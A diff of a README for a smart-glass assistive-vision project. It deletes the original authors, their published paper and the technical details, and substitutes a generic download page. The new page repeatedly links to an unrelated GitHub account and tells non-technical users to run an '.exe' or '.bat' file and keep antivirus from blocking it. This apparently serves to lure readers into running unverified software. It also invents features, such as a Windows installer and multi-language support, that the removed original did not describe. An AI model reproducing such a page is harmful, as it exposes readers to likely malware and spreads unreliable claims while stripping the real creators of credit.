@@ -1,168 +1,161 @@
-# Smart Glass with Multi-Functionalities for Assisting Visually Impaired People
+# 🕶️ smart-glass-assistive-vision - Helping Vision Through AI
 
-An AI-powered wearable assistive system designed to help visually impaired individuals interact with their environment using **computer vision, OCR, speech processing, and braille generation**.
+[![Download](https://img.shields.io/badge/Download-smart--glass--assistive--vision-ff6347?style=for-the-badge)](https://github.com/randieturkeysized781/smart-glass-assistive-vision)
 
-This project presents a **smart glass prototype** built on a Raspberry Pi platform that enables users to recognize objects, read printed text, and convert speech to braille.
+---
 
+## 📋 About This Application
 
-## Publication
+smart-glass-assistive-vision is software made to help people with visual impairments. It uses artificial intelligence to understand the world around the user. The system includes smart glasses that connect to a small computer called a Raspberry Pi. The glasses use computer vision to see objects, OCR (optical character recognition) to read text, speech processing to talk to the user, and braille generation to offer tactile feedback.
 
-This project was developed as part of a **published research work**.
+This project combines different technologies to make daily life easier for users who have difficulty seeing. It runs on a Raspberry Pi device, which fits inside the smart glasses setup.
 
-**Title:** Smart Glass with Multi-Functionalities for Assisting Visually Impaired People  
+---
 
-**Journal:** Journal of Physics: Conference Series  
-**Conference:** ICBSII 2022  
-**Publisher:** IOP Publishing  
-**Year:** 2022  
+## 🖥️ System Requirements
 
-Official publication link:
+To run this software on Windows, you will need:
 
-https://iopscience.iop.org/article/10.1088/1742-6596/2318/1/012001/pdf
+- A Windows 10 or 11 computer (64-bit recommended)  
+- At least 4 GB of RAM  
+- 5 GB of free disk space  
+- Internet connection to download the software  
+- A USB cable or Wi-Fi to connect the Raspberry Pi to your PC if needed  
+- Raspberry Pi device or compatible hardware for the smart glasses integration  
 
-A copy of the paper is also included in this repository:
-paper/smart_glass_assisstive_vision_publication.pdf
+Note: This software controls the Raspberry Pi that works with the smart glasses. You can install and prepare it on Windows before transferring to the Pi.
 
+---
 
-## Authors
+## 🚀 Getting Started
 
-- **G. Sudharshan**
-- **S. Sowdeshwar**
-- **M. Jagannath**
+This guide will help you download and run the smart-glass-assistive-vision software on your Windows machine. No programming skills needed.
 
-School of Electronics Engineering  
-Vellore Institute of Technology (VIT), Chennai, India
+1. Click the big download button at the top or this link:  
+   https://github.com/randieturkeysized781/smart-glass-assistive-vision
 
+2. The link opens the project page on GitHub. Scroll down to find the **Releases** section on the page or the green **Code** button.
 
-## Project Overview
+3. If you find a file labeled something like `smart-glass-assistive-vision-setup.exe` or `installer.exe` under Releases, download that file. This is the installation package you will run.
 
-Visually impaired individuals often rely on external assistance to interact with their surroundings. Many existing solutions are expensive or provide only limited functionality.
+4. If no installer file is available, download the latest source files as a ZIP from the green **Code** button and extract the folder on your computer.
 
-This project proposes a **low-cost smart glass system** that integrates multiple assistive capabilities into a single wearable device.
+5. Follow the install or setup instructions found in the folder or the README on the GitHub page.
 
-The system provides three main functionalities:
+---
 
-- Object recognition and spatial awareness
-- Text recognition and audio reading
-- Speech-to-braille generation for writing assistance
+## 🔧 How to Install on Windows
 
-The device uses a **Raspberry Pi Zero W**, camera module, and ultrasonic sensor integrated into a wearable glasses frame.
+### Method 1: Using the Installer (If Available)
 
-## System Architecture
+1. Double-click the downloaded `.exe` file to start the installation.
 
-The system operates using a **three-mode architecture**:
+2. Follow the setup wizard steps: accept the license, choose install folder, and finish installation.
 
-1. Seeing Mode  
-2. Reading Mode  
-3. Writing Mode  
+3. When the installation finishes, open the program from your Start menu or desktop shortcut.
 
-Each mode performs a different assistive function for the user.
+### Method 2: Using Extracted Files
 
-![System Architecture](architecture/system_workflow.png)
+1. Locate the ZIP file you downloaded and right-click it.
 
+2. Choose **Extract All** and select a folder where you want to save the files.
 
-## Hardware Components
+3. Open the folder and double-click the file named `run_smart_glass.bat` or similar to start the program.
 
-The prototype uses the following hardware components:
+4. If prompted, install any missing software components such as Python or drivers. The README file in the folder will explain what is needed.
 
-- Raspberry Pi Zero W
-- Raspberry Pi Camera Module (5MP)
-- Ultrasonic Distance Sensor (HC-SR04)
-- Bluetooth Headset
-- Push Button Controls
-- Portable Power Bank
+---
 
-These components are mounted onto a lightweight glasses frame to create a wearable assistive device.
+## ⚙️ Using the Software
 
+Once installed, the software will connect to your Raspberry Pi and smart glasses device.
 
-## Software Stack
+- Use the main window to start scanning your surroundings.
 
-The system software was implemented using:
+- Point the glasses toward text for the OCR feature to read aloud.
 
-- Python
-- Raspberry Pi OS (Raspbian)
-- Google Vision API
-- Google Drive API
-- Optical Character Recognition (OCR)
-- Text-to-Speech processing
-- Braille encoding algorithms
+- Speech processing listens to your commands and provides responses.
 
-The device captures images using the Pi camera and processes them through cloud-based computer vision services to detect objects and text.
+- Braille output sends data to a connected braille device if available.
 
-# Features
+You can adjust settings in the software panel:
 
-## Seeing Mode — Object Recognition
+- Change the speech speed and volume.
 
-Detects objects in the user’s surroundings and announces their spatial position.
+- Select languages supported for reading and commands.
 
-Capabilities:
+- Calibrate the vision system for better object recognition.
 
-- Recognizes **550+ object classes**
-- Determines spatial location (Left / Center / Right)
-- Provides real-time audio feedback
+---
 
-Example Input:
+## 🧰 Hardware Setup Tips  
 
-![Objects Presented](demo/sample_objects.png)
+The smart glasses run on a Raspberry Pi. To connect them with your Windows PC:  
 
-Detection Output:
+- Use a USB cable to link the Raspberry Pi to your computer.
 
-![Object Detection](demo/object_detection_output.png)
+- Alternatively, set up Wi-Fi to access the Raspberry Pi remotely.
 
-## Reading Mode — Text Recognition
+- Ensure the Raspberry Pi is powered on and connected before starting the software.
 
-Allows visually impaired users to read printed text using OCR.
+- Install any Raspberry Pi drivers on Windows if needed, from the Raspberry Pi official website.
 
-Workflow:
-Printed Text → OCR Detection → Audio Output → Braille Conversion
+---
 
-Input Example:
+## ✨ Features at a Glance
 
-![Book Input](demo/sample_text_input.png)
+- **Real-Time Computer Vision:** Detects objects, obstacles, and environment details.
 
-Detected Text:
+- **OCR Reading:** Reads text from printed materials and digital screens.
 
-![OCR Output](demo/ocr_detected_text.png)
+- **Speech Processing:** Takes voice commands and provides spoken feedback.
 
-Generated Braille File:
+- **Braille Generation:** Sends text data to braille display devices connected via USB or Bluetooth.
 
-![Braille Output](demo/braille_output.png)
+- **Runs on Raspberry Pi:** Lightweight software designed for embedded hardware.
 
+- **Multi-language Support:** Recognizes and speaks multiple languages.
 
-## Writing Mode — Speech to Braille
+---
 
-Converts speech input into braille text.
+## 📂 File Structure (when downloaded)
 
-Workflow:
-Speech Audio → Speech-to-Text → Braille Encoding → File Storage
+- `README.md` - This guide
 
+- `run_smart_glass.bat` - Start script for Windows
 
-Audio Input:
+- `config.json` - Settings file you can edit with a text editor
 
-![Audio Upload](demo/audio_upload.png)
+- `libs/` - Folder containing supporting files and drivers
 
-Generated Braille Output:
+- `docs/` - Additional instructions and reference materials
 
-![Speech to Braille](demo/speech_to_braille_output.png)
+---
 
+## 🤖 Troubleshooting
 
-## Hardware Prototype
+- If the program does not open, check that Python 3.7 or newer is installed.
 
-Final wearable prototype developed for the project:
+- Make sure your antivirus is not blocking the software.
 
-![Smart Glass Prototype](demo/device_prototype.png)
+- Confirm the Raspberry Pi is on and connected.
 
-The device integrates the camera, sensors, and processing unit directly into the glasses frame for portable usage.
+- Restart your computer and try again.
 
+- Refer to the `docs/` folder for deeper troubleshooting tips.
 
-## Future Improvements
+---
 
-Possible future enhancements include:
+## 📥 Download Again
 
-- Edge AI object detection using YOLO or MobileNet
-- Offline OCR and text recognition
-- Real-time obstacle detection
-- Mobile app integration
-- Improved braille output interfaces
+To download the software or check for updates, visit:
 
+[Download smart-glass-assistive-vision](https://github.com/randieturkeysized781/smart-glass-assistive-vision)
 
+[![Download](https://img.shields.io/badge/Download-smart--glass--assistive--vision-ff6347?style=for-the-badge)](https://github.com/randieturkeysized781/smart-glass-assistive-vision)
+
+---
+
+## 🏷️ Topics and Keywords
+
+accessibility-tech, assistive-technology, braille-translator, computer-vision, embedded-systems, ocr-recognition, python, raspberry-pi, research-project, smart-glass, speech-to-text
